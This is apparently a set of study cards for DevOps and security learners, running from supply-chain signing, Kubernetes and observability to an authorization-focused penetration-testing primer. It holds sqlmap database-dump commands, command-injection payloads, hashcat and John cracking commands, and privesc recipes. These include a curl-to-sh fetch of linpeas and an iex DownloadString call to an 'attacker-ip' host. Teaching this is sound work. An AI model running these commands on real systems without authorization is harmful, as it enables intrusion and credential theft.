Standard / ToolAnswers
SBOM"What's inside?" — a bill of materials (SPDX/CycloneDX)
SLSA"How was it built?" — build-integrity levels & provenance
Sigstore / cosign"Is it really ours?" — keyless signing of artifacts
Dependency scanningTrivy, Grype, Dependabot — find vulnerable deps (SCA)
# Generate an SBOM and sign an image (keyless, via OIDC)
syft myimage:1.0 -o cyclonedx-json > sbom.json
cosign sign myimage:1.0
cosign verify myimage:1.0 --certificate-identity ...
Then enforce it: an admission controller can reject unsigned images at deploy time — provenance you actually check, not just generate.
📜 Policy as Code — OPA/Rego & Kyverno Governance ▶
Concept
Guardrails That Enforce Themselves
Instead of a wiki page saying "don't deploy public S3 buckets," policy-as-code makes the rule executable — checked automatically in CI or blocked at admission. Governance becomes a test that fails, not a review someone forgets.
ToolDetail
OPA / RegoGeneral policy engine; Gatekeeper enforces it on K8s
KyvernoK8s-native policy in YAML (no new language to learn)
ConftestRun OPA policies against Terraform/JSON/YAML in CI
Cloud-nativeAWS SCPs, GCP Org Policy, Azure Policy
Where to enforce: shift left (CI catches it before merge) and defense in depth (admission control catches it at runtime). Ties directly to the CIS Benchmarks and cloud-security cards.
🗄️ Artifact & Registry Management Delivery ▶
Reference
Where Build Outputs Live
A pipeline builds artifacts — container images, jars, npm packages — that need a trusted, versioned home between build and deploy. Registries provide storage, access control, scanning, and immutability.
RegistryStores
HarborSelf-hosted container registry + scanning + signing
Artifactory / NexusUniversal (Docker, Maven, npm, PyPI…)
GHCR / ECR / Artifact RegistryCloud/platform-native registries
Practices: immutable tags (never re-push :v1.2.3), retention policies to prune old images, scan on push, and promote the same digest through dev→staging→prod rather than rebuilding — build once, promote everywhere.
🕸️ Kubernetes Networking & Storage — CNI & CSI Kubernetes ▶
Reference
How Pods Talk and Where Data Lives
Kubernetes defers networking and storage to pluggable interfaces, so the cluster works the same whether you run on AWS, bare metal, or a laptop. CNI wires up pod networking; CSI attaches persistent storage.
LayerDetail
CNI pluginCalico, Cilium, Flannel — gives every pod an IP; enforces NetworkPolicy
Service & kube-proxyStable virtual IP + load-balancing across pod replicas
Ingress controllerNGINX, Traefik — HTTP routing & TLS into the cluster
CSI driverProvisions PersistentVolumes from EBS/PD/etc. via a PVC
StorageClassDefines a tier (ssd, standard) for dynamic provisioning
Cilium (eBPF-based) is increasingly the default — it does networking, NetworkPolicy, and observability in one. Storage: a PVC requests, the StorageClass + CSI driver fulfill it.
🔥 Prometheus & Grafana — Metrics & Dashboards Observability ▶
Reference
The Open-Source Monitoring Standard
Prometheus scrapes metrics from targets, stores them as time-series, and lets you query with PromQL. Grafana visualizes them; Alertmanager routes the alerts. It's the de-facto stack for cloud-native metrics. 
# PromQL: 5xx error rate over the last 5 minutes, per service
sum by (service) (rate(http_requests_total{status=~"5.."}[5m]))
  / sum by (service) (rate(http_requests_total[5m]))
PieceRole
PrometheusPull-based scraping + TSDB + PromQL
Exportersnode_exporter, cAdvisor — expose metrics to scrape
AlertmanagerDedup, group & route alerts to Slack/PagerDuty
GrafanaDashboards over Prometheus, Loki, and more
Scale note: Prometheus is single-node by design; Thanos/Mimir/Cortex add long-term storage and HA. Instrument with OpenTelemetry to stay portable.
🚦 Golden Signals + RED & USE — What to Measure Observability ▶
Concept
Three Small Frameworks That Cut the Noise
You can graph a thousand metrics and still miss the outage. These frameworks tell you the few signals that actually indicate user pain — so alerts fire on symptoms, not on every twitch.
FrameworkMeasureBest for
Golden SignalsLatency, Traffic, Errors, SaturationAny service (Google SRE)
REDRate, Errors, DurationRequest-driven services
USEUtilization, Saturation, ErrorsResources (CPU, disk, queues)
Rule of thumb: alert on symptoms users feel (latency/errors), not causes (high CPU) — a busy CPU that still serves fast isn't an incident. Page on the golden signals; keep the rest for debugging.
🎯 SLIs, SLOs & Error Budgets SRE ▶
Concept
Turning Reliability Into a Number You Can Spend
100% reliability is the wrong target — it's impossible and ruinously expensive. SRE instead sets an explicit reliability goal and treats the gap as a budget you can spend on shipping features.
TermMeaning
SLIThe measurement — e.g. % of requests < 300ms & 2xx
SLOThe target for that SLI — e.g. 99.9% over 30 days
Error budget1 − SLO = allowed unreliability (0.1% ≈ 43 min/month)
SLAThe contractual promise (with penalties) — looser than the SLO
The policy: budget left → ship fast; budget burned → freeze features and fix reliability. Burn-rate alerts (spending the budget too fast) are the modern replacement for threshold alerts. This is the SRE card, made operational.
🪵 Structured Logging & Log Pipelines Observability ▶
Concept
Logs You Can Actually Query
A log line like User 42 failed login from 1.2.3.4 is human-readable but painful to search at scale. Structured logging emits key-value/JSON so every field is filterable, and correlation IDs stitch a request's logs together across services. 
# Structured (JSON) — machine-queryable, ties to a trace
{"level":"warn","event":"login_failed","user_id":42,
 "src_ip":"1.2.3.4","trace_id":"abc123"}
PieceRole
Correlation / trace IDFollow one request across every service & log
CollectorFluent Bit / Vector / OTel Collector ship & enrich logs
StoreLoki, Elasticsearch, or a cloud logging service
Structured logs feed both ops and security (SIEM) — the same pipeline that helps you debug latency helps the blue team hunt. The three pillars — metrics, logs, traces — correlate via that shared ID.
📟 On-Call Done Humanely SRE · Culture ▶
Concept
Sustainable Operations, Not Hero Burnout
On-call is necessary but corrosive when done badly — pages at 3am for non-issues drive burnout and attrition. Good on-call is designed: few, actionable alerts and a culture that fixes root causes.
PracticeDetail
Actionable alerts onlyIf a human can't act on it, it's a dashboard, not a page
RunbooksEvery alert links to "what to check & do"
Sane rotationsFollow-the-sun or weekly; comp time; not the same 2 people
Blameless postmortemsBlame systems, not people — psychological safety fixes more
Toil budgetCap manual work; automate what pages you repeatedly
The feedback loop that matters: every real page should make the next one less likely — via a fix, better alerting, or automation. That's the "Feedback" and "Learning" of the Three Ways, applied to operations.
🎯 Penetration Testing
PT+
5-Phase Methodology · OWASP Top 10 · Engagement Types ▾
🎯 Penetration Testing Phases 5-PHASE METHODOLOGY ▶
Methodology
Planning → Recon → Scan → Exploit → Report
Engagement types: Black Box (no info) · White Box (full info) · Grey Box (partial info). Always requires written authorization (Rules of Engagement / Statement of Work).
Planning & Scoping
Define objectives · Rules of Engagement (RoE) · Target IP ranges & apps · Legal authorization · NDA · SoW · Emergency contacts · Timeline
Reconnaissance & OSINT
Passive: WHOIS, DNS, Shodan, LinkedIn, cert transparency logs · Active: Nmap, banner grabbing, subdomain enumeration, network mapping
Scanning & Enumeration
Vulnerability scanning · Service versioning · SMB/SNMP/LDAP enumeration · Web app scanning (Burp Suite, Nikto) · Credential spraying · Fuzzing
Exploitation & Post-Exploitation
Exploit vulns (Metasploit, custom PoC) · Priv esc · Lateral movement · Persistence (backdoors, scheduled tasks) · Data exfiltration proof · Pivoting
Reporting & Remediation
Executive summary · Technical findings (CVSS scored) · PoC evidence & screenshots · Remediation guidance · Attestation · Clean-up IOCs · Retesting
🌐 OWASP Top 10 (2021) WEB VULNERABILITIES ▶
Reference
Top 10 Web Application Security Risks
A01
Broken Access Control
Restrictions not enforced; IDOR, privilege escalation, force browsing
A02
Cryptographic Failures
Weak/missing encryption, cleartext sensitive data, deprecated algorithms
A03
Injection
SQL, OS command, LDAP, NoSQL injection — untrusted data to interpreter
A04
Insecure Design
Missing controls at design phase; threat modeling failures, insecure patterns
A05
Security Misconfiguration
Default creds, open storage, verbose errors, unnecessary features enabled
A06
Vulnerable & Outdated Components
Unpatched libraries, frameworks, OS components with known CVEs
A07
ID & Auth Failures
Weak passwords, no MFA, session fixation, credential stuffing
A08
Software & Data Integrity Failures
Insecure deserialization, CI/CD pipeline attacks, unsigned updates
A09
Logging & Monitoring Failures
No alerting on failed logins, logs not protected or centralized, no SIEM
A10
Server-Side Request Forgery
Server fetches attacker-controlled URL; used to reach internal/cloud metadata
💉 SQLmap — SQL Injection Tool Reference PENTEST TOOL ▶
Reference — Source: SQLmap Cheat Sheet
SQLi Attack Types · Target Options · Detection · Enumeration
SQLmap automates SQL injection detection and exploitation. Runs on Python 2.6, 2.7, and 3. Kali Linux: sqlmap. Other: python3 sqlmap.py. Always use with written authorization.
▸ SQL INJECTION ATTACK CATEGORIES
Category Technique Description
In-Band Error-based DB error messages leak config/structure. Flag: -technique=E
Union-based UNION keyword appends attacker query to legitimate result. Flag: -technique=U
Stacked queries Multiple statements joined by ; — modifies/reads DB in one call. Flag: -technique=S
Inline queries Embedded partial SQL in server-side code. Flag: -technique=Q
Out-of-Band DNS exfiltration Results sent via DNS/HTTP to separate channel. Use --dns-domain
Inferential (Blind) Boolean-based Tautologies (1=1) change app behavior to infer data. Flag: -technique=B
Time-based Inject sleep/wait — if delay occurs, DB is vulnerable. Flag: -technique=T
BASIC USAGE PATTERN
# Syntax sqlmap [target] [options] # Step 1: Fingerprint the database sqlmap -u "http://target.com/page.php?id=1" -f --batch # Step 2: List all databases sqlmap -u "http://target.com/page.php?id=1" --dbs --batch # Step 3: List tables in specific database sqlmap -u "http://target.com/page.php?id=1" -D mydb --tables --batch # Step 4: Dump specific table columns sqlmap -u "http://target.com/page.php?id=1" -D mydb -T users --columns --batch # Step 5: Dump all data from table sqlmap -u "http://target.com/page.php?id=1" -D mydb -T users --dump --batch # With session cookie (authenticated scan) sqlmap -u "http://target.com/page?id=1" \ --cookie="PHPSESSID=abc123; security=low" \ --tables --batch
▸ KEY OPTIONS REFERENCE
Flag Purpose
-u URL Target URL containing vulnerable parameter (e.g., ?id=1)
-g DORK Google dork — sqlmap will scan matching results
-r FILE Load HTTP request from Burp Suite save file
--batch Never prompt — use default answers (scripting)
--dbs Enumerate all accessible databases
--tables Enumerate tables in target database
--columns Enumerate columns in target table
--dump Dump table data
--passwords Enumerate & attempt to crack user password hashes
-p PARAM Specify parameter to test (e.g., -p "id,user-agent")
--dbms=mysql Force back-end DBMS (mysql/postgresql/mssql/oracle)
--proxy=URL Route through proxy (Burp: http://127.0.0.1:8080)
--tor Route through Tor anonymity network
--random-agent Use random User-Agent header to evade WAF
--tamper=SCRIPT Apply tamper script to bypass WAF/IPS
--technique=BEUSTQ SQLi techniques: B=Boolean E=Error U=Union S=Stacked T=Time Q=Inline
▸ --LEVEL AND --RISK SETTINGS
Setting Value Behaviour
--level 1 (default) GET/POST params only — minimal requests
--level 2 Also tests Cookie headers
--level 3 Also tests User-Agent and Referer headers
--level 4–5 Null values, edge case payloads
--risk 1 (default) Safe — data unchanged, DB stays operational
--risk 2 Adds heavy time-based tests — may slow DB
--risk 3 OR-based tests — may UPDATE all table rows

SCANNER
OpenVAS / Greenbone
Greenbone's free, full-featured vulnerability scanner. Runs thousands of Network Vulnerability Tests (NVTs) from a maintained feed and reports findings with CVSS scores and remediation. The leading open-source alternative to Nessus.
# Greenbone / OpenVAS (Kali)

Commercial scanners with deep plugin libraries and compliance audits. Nessus (Tenable) is the industry standard; Nexpose / InsightVM (Rapid7) integrates tightly with Metasploit.
WEB
Web Vulnerability Scanners
Nikto checks web servers for known issues, WPScan targets WordPress, and Nuclei runs fast template-based checks at scale.
# Fast templated web scan
nuclei -u https://target -severity high,critical
nikto -h https://target
wpscan --url https://target --enumerate u,vp
WORKFLOW
Scan → Validate → Prioritize
Scanners surface potential issues but generate false positives. Always validate manually before reporting, and rank by CVSS plus real-world exploitability (EPSS / known-exploited).

🧒Ethical Hacking 101PenTest+ • Start Here▶
BIG IDEA
What Is a Penetration Test?
A pentest is hiring someone to break into your systems on purpose — with permission — to find the holes before a real attacker does. Think of a hotel paying a locksmith to test every lock and report which ones are weak.
THE LINE
Permission Is Everything
The only difference between a penetration tester and a criminal is written authorization and scope. Same tools, same techniques — but one has a signed 'get-out-of-jail' agreement saying exactly what they're allowed to touch.
STYLES
Black / Gray / White Box
Black-box = the tester knows nothing (like a real outsider). White-box = they get full details and source (a thorough inside review). Gray-box is in between. More knowledge = deeper testing in less time.
MINDSET
Think Like an Attacker
Hacking is mostly curiosity plus stubbornness: 'What happens if I do the unexpected?' Testers chain small, boring weaknesses into one big problem — which is exactly why defenders should fix the 'small' stuff.
PhaseIn Plain English
ReconQuietly learn everything public about the target
ScanningKnock on doors to see what's open
ExploitationUse a weakness to get in
Post-exploitSee how far you can reach once inside
ReportingWrite up findings + how to fix them — the real product
🧾Scoping & Rules of EngagementPenTest+ • Start Here▶
WHY PAPERWORK
The Boring Part Keeps You Out of Jail
Before any hacking, both sides sign what’s allowed. This isn’t bureaucracy for its own sake — it’s the difference between a paid professional and a felony. Scope and authorization are the seatbelt of the job.
SCOPE
What’s In, What’s Off-Limits
Scope lists exactly which systems, addresses, and techniques are fair game — and which are absolutely not (production payroll, third-party clouds, physical break-ins). When in doubt, it’s out of scope.
SAFETY
Deconfliction & the ‘Get-Out-of-Jail’ Letter
Testers carry written authorization in case security catches them (good — that means detection works!). A deconfliction contact lets everyone quickly tell ‘is this the tester, or a real attacker?’ during the engagement.
RoE ItemWhy It’s There
AuthorizationWritten proof you’re allowed
Scope / exclusionsExactly what you may and may not touch
Time windowsWhen testing is permitted
Data handlingHow findings & sensitive data are protected
Emergency contactWho to call if something goes wrong
🔓 Getting Started in Ethical Hacking — The Right Way PENTEST • Start Here ▶
LEGAL FOUNDATION
Authorization Is Everything
Hacking without permission is a federal crime in the US (CFAA) and illegal worldwide. Authorization must be explicit, in writing, before you touch anything. "It was just a test" is not a defense. Ethical hacking means having a signed contract, defined scope, and legal protection before you start.
THE LEARNER'S PATH
Legal Practice Environments
Your own lab: VMs on your laptop (VirtualBox + Kali Linux + vulnerable VMs like Metasploitable, DVWA). 100% legal, full control.
Hack The Box (HTB): paid platform with realistic machines to compromise. Legal by design.
TryHackMe: beginner-friendly guided rooms with hand-holding. Best starting point.
PicoCTF, CTFtime: Capture The Flag competitions. Legal challenges with prizes.
OWASP WebGoat: intentionally vulnerable web app for learning web attacks.
FOUNDATION KNOWLEDGE
What to Learn Before "Hacking"
The best hackers are really strong defenders first. Build this foundation:
1. Networking fundamentals (TCP/IP, DNS, HTTP, firewalls)
2. Linux command line (file system, permissions, processes, scripting)
3. Programming basics (Python especially — automate, parse, build tools)
4. Web technology (HTML, HTTP methods, cookies, sessions, same-origin policy)
5. OS security concepts (users, privilege, authentication)
6. Cryptography basics (hashing, symmetric, asymmetric)
Then take CompTIA Security+ → CEH/OSCP path.
CERTIFICATIONS
Industry-Recognized Pentest Certs
CertLevelStyleFocus
CompTIA Security+BeginnerMultiple choiceBroad security concepts
CompTIA PenTest+IntermediateMC + performancePentest methodology
CEH (EC-Council)IntermediateMultiple choiceTools and techniques (theory-heavy)
OSCP (OffSec)Advanced24-hr practical examHands-on exploitation; gold standard
GPEN (GIAC)AdvancedMC + practicalNetwork pentesting
KALI LINUX
The Pentest Distro
Kali Linux (by Offensive Security) is a Debian-based distro pre-loaded with hundreds of security tools: Nmap, Metasploit, Burp Suite, Wireshark, Aircrack-ng, John the Ripper, Hashcat, and more. Don't use Kali as your daily driver — it runs as root by default and is designed for testing, not everyday use. Run it in a VM or bootable USB for lab work.
🔍 Basic Recon & Enumeration — Know Your Target PENTEST • Foundation ▶
PASSIVE vs ACTIVE RECON
Invisible vs Detectable
Passive recon — gather information WITHOUT touching the target. No packets sent to their systems. Examples: WHOIS, DNS lookups, Google dorking, LinkedIn, Shodan, certificate transparency logs. Hard to detect.
Active recon — directly query the target's systems. Port scans, banner grabbing, web crawling. Generates logs on their end. Only legal with authorization.
NMAP BASICS
The Port Scanner Every Tester Uses
# Quick scan — top 1000 ports nmap 192.168.1.1 # SYN scan (stealthier, requires root) sudo nmap -sS 192.168.1.1 # Service/version detection nmap -sV 192.168.1.1 # OS fingerprinting sudo nmap -O 192.168.1.1 # Full scan: all ports + service + OS + scripts sudo nmap -A -p- 192.168.1.1 # Scan a range nmap 192.168.1.0/24 # Output to file nmap -oA scan_results 192.168.1.1
OSINT TOOLS
Open-Source Intelligence
Shodan — search engine for internet-connected devices. Find exposed cameras, industrial control systems, unpatched servers.
theHarvester — collect emails, subdomains, hosts from public sources.
Maltego — visual relationship mapping (person → email → domain → IP → org).
Google Dorks — advanced Google search operators to find sensitive files: site:example.com filetype:pdf "confidential"
crt.sh — certificate transparency logs; find all subdomains of a domain.
🕸️ Web Application Pentesting — Hacking the Web Safely PENTEST • Methodology ▶
WEB APP ATTACK SURFACE
Where Web Vulnerabilities Live
Web applications are the most attacked surface in modern environments. Unlike network pentesting (ports and protocols), web app testing focuses on application logic, input handling, and authentication. The good news: most web vulnerabilities are predictable and well-documented (OWASP). The bad news: developers keep repeating the same mistakes.
LayerWhat to TestCommon Findings
AuthenticationLogin, password reset, MFA bypassWeak passwords, enumeration, broken token reset
AuthorizationHorizontal/vertical privilege escalationIDOR — access other users' data by changing IDs
Input HandlingForms, query params, headers, file uploadsSQLi, XSS, XXE, command injection
Session ManagementCookies, tokens, session fixationPredictable tokens, missing Secure/HttpOnly flags
Business LogicPurchase flows, transfers, state machinesNegative quantities, price manipulation, race conditions
API EndpointsREST/GraphQL endpointsMissing auth, verbose errors, mass assignment
BURP SUITE BASICS
The Swiss Army Knife for Web Testing
Burp Suite is the industry-standard web proxy for intercepting, modifying, and replaying HTTP/HTTPS traffic. The Community edition is free and powerful enough for most learning. Professional adds the scanner.
ToolPurposeBeginner Use
Proxy → InterceptPause and inspect every requestSee what the browser actually sends
Proxy → HTTP HistoryLog of all requests madeFind interesting endpoints and parameters
RepeaterResend and modify individual requestsTest input handling by changing values manually
IntruderAutomated fuzzing with payload listsPassword spraying, parameter enumeration
DecoderEncode/decode base64, URL, HTML, hexDecode tokens and encoded parameters
Scanner (Pro)Automated vulnerability scanningPassive and active scanning
IDOR DEEP DIVE
Insecure Direct Object Reference — The #1 Finding
IDOR (now categorized under Broken Access Control, OWASP A01) occurs when an application uses user-controllable references to access objects without verifying the user is authorized. It's the most common web vulnerability by volume.
# Vulnerable pattern — user ID directly in URL GET /api/users/1234/profile # your profile GET /api/users/1235/profile # someone else's — do you get it? # Vulnerable pattern — order ID in parameter GET /orders?id=8821 # your order GET /orders?id=8820 # try decrementing — another user's order? # Where to look - Numeric IDs in URLs, query params, request bodies - GUIDs (sometimes predictable if v1 — time-based) - Encoded values — decode them first (base64, hex) - Hidden form fields with IDs # How to test 1. Create two test accounts (Alice and Bob) 2. As Alice, perform action that creates a resource → note the ID 3. Log in as Bob, try to access the same resource ID 4. If Bob can access Alice's resource = IDOR
COMMAND INJECTION
When the App Runs Your Input as Shell Commands
Command injection occurs when user input is passed to a system shell without sanitization. If you can get your input executed as OS commands, you typically own the server. Critical severity — always.
# Common in features that: ping IPs, resolve DNS, process files, # run nmap, send email via sendmail, resize images via ImageMagick # Basic test payloads — try in any input field ; id # semicolon chains commands && id # run if first cmd succeeds || id # run if first cmd fails `id` # backtick subshell $(id) # $() subshell (URL: %24%28id%29) | id # pipe output # If you see "uid=33(www-data)" in the response — confirmed! # Blind injection — no output visible, infer via timing ; sleep 5 # if response delays 5s — blind injection exists

🔓 Password Attacks — How Credentials Get Cracked PENTEST • Authorized Only ▶
⚠️ ETHICS FIRST
Only on Systems You're Authorized to Test
Everything here is for authorized penetration testing, CTFs, your own lab, and understanding defense. Cracking passwords you don't own is a crime. The reason defenders learn these techniques is to understand why strong hashing, MFA, and rate-limiting matter — and to test their own org's resilience with written authorization.
ATTACK TYPES
Online vs Offline Attacks
AttackHow It WorksDefense
Brute forceTry every possible combinationLength + complexity (makes it infeasible)
DictionaryTry a wordlist of likely passwordsDon't use common passwords
Credential stuffingReuse leaked user:pass from other breachesUnique passwords per site; MFA
Password sprayingTry ONE common password against MANY accounts (avoids lockout)MFA, anomaly detection
Rainbow tablesPrecomputed hash→password lookupsSalting (makes tables useless)
Online attacks hit a live login (slow, rate-limited, detectable). Offline attacks crack a stolen hash database locally (fast, unlimited guesses — why a breached hash dump is so dangerous).
HASH CRACKING
hashcat and John the Ripper
When attackers steal a database, they get password hashes, not plaintext. Cracking tools guess passwords, hash each guess, and compare. GPUs make this billions of guesses per second — which is why weak hashing (fast MD5/SHA1, no salt) is catastrophic and slow hashing (bcrypt, Argon2) is essential.
# Identify a hash type first hashid '$2y$10$...' # identifies bcrypt # hashcat — dictionary attack (mode -a 0) hashcat -m 0 -a 0 hashes.txt rockyou.txt # -m 0 = MD5 hashcat -m 1000 -a 0 ntlm.txt rockyou.txt # -m 1000 = NTLM # hashcat — with rules (mutate words: P@ssw0rd!, etc.) hashcat -m 0 -a 0 hashes.txt rockyou.txt -r best64.rule # hashcat — brute force a mask (mode -a 3) hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d?d?d # Ulll dddd # John the Ripper john --wordlist=rockyou.txt hashes.txt john --show hashes.txt # show cracked results
WORDLISTS & RULES
The Attacker's Ammunition
ResourceWhat It Is
rockyou.txt14M real passwords from a 2009 breach — the classic starter wordlist
SecListsHuge collection of wordlists for passwords, usernames, fuzzing, payloads
Mutation rulesTransform words: capitalize, append years/symbols (best64, dive)
Custom (CeWL)Scrape a target's website to build a tailored wordlist
crunchGenerate wordlists by pattern (for masks/known formats)
The defensive lesson: this is exactly why length beats complexity. A 16-character passphrase resists all of this; "P@ssw0rd1" falls in milliseconds because it's in every wordlist and matches every rule.
⬆️ Privilege Escalation — From Foothold to Full Control PENTEST • Authorized Only ▶
⚠️ AUTHORIZED USE ONLY
Your Lab, CTFs, or Written Engagements
Privilege escalation techniques are core to penetration testing and equally core to defending — knowing how attackers escalate tells you what to harden. Practice only on systems you own or are explicitly authorized to test (HTB, TryHackMe, your home lab).
THE CONCEPT
Two Directions of Escalation
After getting initial access (a foothold), attackers rarely land with the privileges they want. Privilege escalation is the step of gaining higher access.
TypeMeaningExample
Vertical (privesc)Gain HIGHER privilegesStandard user → root/admin
HorizontalAccess ANOTHER user's resources at the same levelUser A reads User B's files
ENUMERATION FIRST
"Enumeration Is 90% of Privesc"
You can't escalate what you haven't found. Systematic enumeration of the system reveals the misconfiguration or vulnerability that lets you escalate. Automated scripts (run only in authorized labs) speed this up enormously.
CheckLinuxWindows
Who am I / privilegesid, sudo -lwhoami /priv
SUID / special permsfind / -perm -4000 2>/dev/nullUnquoted service paths, weak ACLs
Scheduled taskscat /etc/crontabschtasks /query
Kernel / OS versionuname -asysteminfo
Stored credentialsconfig files, history, .envRegistry, SAM, unattended files
Automated helperLinPEAS, linenum.shWinPEAS, PowerUp
COMMON VECTORS
How Escalation Actually Happens
VectorWhy It WorksDefense
Misconfigured sudoA user can run a program as root that can spawn a shellRestrict sudoers; review sudo -l
SUID binariesA SUID program can be abused to run as its owner (root)Remove unneeded SUID bits
Writable scripts run by rootA cron job runs your modified script as rootFix file permissions
Kernel exploitsUnpatched kernel vulnerabilityPatch promptly
Stored/reused credentialsPasswords in files, reuse across accountsSecrets management, unique creds
PATH hijackingPrivileged script calls a binary by relative nameUse absolute paths in scripts
GTFOBins (and LOLBAS for Windows) are reference sites listing how common binaries can be abused for escalation — invaluable for both attackers and defenders auditing their systems.
Beginner Privilege Escalation – From Low User to Root/Admin
Core Concept
What Is Privilege Escalation?
After gaining initial access to a system, an attacker (or penetration tester) typically has limited permissions. Privilege escalation (privesc) is the process of gaining higher permissions — becoming root on Linux or Administrator/SYSTEM on Windows.

Two types:
• Vertical privesc — low user → admin/root (most common).
• Horizontal privesc — user A accessing user B's data without being admin (e.g., IDOR vulnerabilities).

Why it matters for defenders: understanding how attackers escalate helps you close the gaps. Every misconfiguration covered here is something you can find and fix on your own systems before an attacker does.

"Assume" makes an ass out of you and me — never assume a low-privilege shell is harmless. Assume the attacker will look for every path to root.
Linux PrivEsc
Common Linux Escalation Paths
These are the first things a pentester (and automated tools like LinPEAS) look for on a Linux box:
# 1. Sudo misconfigurations — what can this user sudo? sudo -l # If you see (ALL) NOPASSWD: /bin/vi → you can get a shell: # sudo vi → :!bash (in vi command mode) # 2. SUID binaries — run as owner (root) regardless of who runs them find / -perm -4000 -type f 2>/dev/null # Dangerous SUID binaries: find, vim, python3, bash, cp # GTFOBins (gtfobins.github.io) lists how to abuse each one # 3. World-writable scripts run by root (cron jobs) # Find scripts called by root's crontab that any user can edit cat /etc/crontab ls -la /etc/cron.d/ find /var/spool/cron /etc/cron* -type f 2>/dev/null | xargs ls -la # 4. Writable /etc/passwd (legacy systems) ls -la /etc/passwd # should be -rw-r--r-- (644) # 5. Kernel exploits — check kernel version uname -r # Search CVEs for that version (e.g. DirtyPipe CVE-2022-0847) # Automated enumeration (always use on authorised systems only) curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
Windows PrivEsc
Common Windows Escalation Paths
Windows privesc is equally rich. These are the most-seen vectors in CTF competitions and real engagements:
# 1. Unquoted service paths # If a service binary path has spaces and no quotes, Windows may # execute an attacker's binary instead. wmic service get name,pathname,startmode | findstr /i /v "c:\windows\" # Look for paths like: C:\Program Files\My App\service.exe # Windows tries: C:\Program.exe → C:\Program Files\My.exe → ... # 2. Weak service permissions (can modify service binary) accesschk.exe -uwcqv "Everyone" * /accepteula # If you can write to a service binary, replace it with your payload # 3. AlwaysInstallElevated (MSI runs as SYSTEM) reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated # If both = 1 → msiexec /quiet /qn /i malicious.msi # 4. Stored credentials in registry / files reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s findstr /si password *.txt *.xml *.config # 5. Automated enumeration (authorised use only) # PowerShell: download and run WinPEAS iex (New-Object Net.WebClient).DownloadString('http://attacker-ip/winpeas.ps1')
Defence Takeaway
Closing PrivEsc Gaps as a Defender
Run the same enumeration tools on your own systems to find weaknesses first:

• Audit sudo -l output for all accounts; remove unnecessary NOPASSWD entries.
• Remove SUID bit from binaries that don't need it: chmod u-s /path/to/binary
• Quote all service paths in Windows services.
• Ensure service account binaries are not world-writable.
• Disable AlwaysInstallElevated via GPO.
• Rotate any plaintext credentials found in registry or files.
• Keep kernels patched — most kernel exploits are patched within weeks of disclosure.
Beginner Pentest Reporting – The Skill That Makes or Breaks Your Career
Core Concept
The Report IS the Deliverable
Here's something that surprises new pentesters: the client isn't paying for the hacking — they're paying for the report. The exploitation is invisible to them; the report is the only artifact that proves value, drives budget decisions, and gets vulnerabilities fixed.

A brilliant exploit chain documented poorly helps no one. A moderate finding explained clearly, with a fix the client can actually implement, changes the organisation's security posture.

"Not my circus, not my monkey" — your job is to find and clearly document risk, not to fix it yourself or shame the team that introduced it. Stay in your lane; the client's team owns remediation.
Structure
Anatomy of a Professional Pentest Report
Most reports follow this structure — because it serves two very different audiences in one document:
1. EXECUTIVE SUMMARY (for leadership — 1-2 pages, no jargon) - Why the test was done, scope, and timeframe - Overall risk posture in plain language - Top 3-5 findings and their business impact - High-level recommendations and themes 2. SCOPE & METHODOLOGY (for the record) - What was tested (IPs, applications, date range) - What was explicitly OUT of scope - Testing methodology / framework used (e.g. PTES, OWASP) - Rules of engagement (testing windows, contacts, escalation path) 3. FINDINGS (for the technical team — the bulk of the report) For EACH finding: - Title & unique ID (e.g. "F-001: SQL Injection in Login Form") - Severity (Critical / High / Medium / Low / Informational) - CVSS score (standardized severity scoring — see below) - Description: what the vulnerability is, in plain terms - Evidence: screenshots, request/response pairs, proof-of-concept - Impact: what an attacker could actually DO with this - Remediation: SPECIFIC steps to fix it (not "improve security") - References: CWE ID, OWASP category, vendor advisories 4. APPENDICES - Raw scan output, tool versions, full request/response logs
Severity Scoring
CVSS – Communicating Severity Consistently
CVSS (Common Vulnerability Scoring System) turns "this seems pretty bad" into a reproducible number from 0-10, based on factors like attack complexity, privileges required, and impact on confidentiality/integrity/availability.

ScoreSeverityTypical client reaction
9.0 - 10.0CriticalDrop everything, fix today
7.0 - 8.9HighFix within days/this sprint
4.0 - 6.9MediumFix within the quarter
0.1 - 3.9LowFix when convenient
0.0InformationalAwareness only, no action required

"Assume" makes an ass out of you and me — never assume your gut feeling about severity matches the client's risk tolerance. CVSS gives both sides a shared, defensible scale — use the official calculator at first.org/cvss/calculator.
Communication
Writing Findings People Actually Act On
You can't make someone make the right choice, yet you can pick up the pieces afterwards — but you absolutely CAN make the right choice the easiest one to make, by writing findings that remove every excuse not to fix them.

Compare these two remediation write-ups:

Weak: "Improve input validation and sanitize user input to prevent injection attacks."
(What does the developer actually DO with this on Monday morning?)

Strong: "Replace the string-concatenated SQL query in login.py line 47 with a parameterized query using the existing SQLAlchemy ORM (see user_search.py line 112 for an example already in the codebase). Estimated effort: 1-2 hours including tests."

The second version respects the reader's time, references their own code, gives a model to copy, and estimates effort for planning — it gets fixed this week instead of sitting in a backlog for a year.
Beginner

Password Attacks 101 – Cracking, Spraying, and Why MFA Matters

Scope & ethics first

These techniques require written authorization

Everything below is standard material in authorized penetration testing engagements, certifications (Security+, PenTest+, OSCP), and home lab practice against systems you own. Running these against accounts or systems you don't have explicit written permission to test is illegal in most jurisdictions — full stop. The value of learning this material is understanding why password policies, MFA, and account lockout settings exist, so you can defend against these techniques as well as recognize when they're being used against you.

Concept

Three different attacks that all "guess passwords" — but very differently

AttackHow it worksWhat makes it noisy or quiet
Brute forceTry every possible character combination against one accountExtremely noisy and slow — usually only feasible offline against a stolen hash
Dictionary / wordlist attackTry a curated list of common/likely passwords against one accountFaster than brute force; still triggers lockouts if done online
Password sprayingTry one or two common passwords (e.g. Summer2026!) across many accountsQuiet — stays under per-account lockout thresholds, which is exactly why it's an attacker favorite

Password spraying is the one most likely to slip past basic defenses, because lockout policies are almost always designed around "five bad attempts on one account" — not "one bad attempt across five thousand accounts."

Hands-on (lab only)

Cracking a hash you already captured, offline

# Hashcat against a captured NTLM hash, using a wordlist + rule set
# (mode 1000 = NTLM; -a 0 = dictionary attack)
hashcat -m 1000 -a 0 captured_hashes.txt rockyou.txt -r best64.rule

# John the Ripper, similar idea — auto-detects the hash format
john --wordlist=rockyou.txt captured_hashes.txt
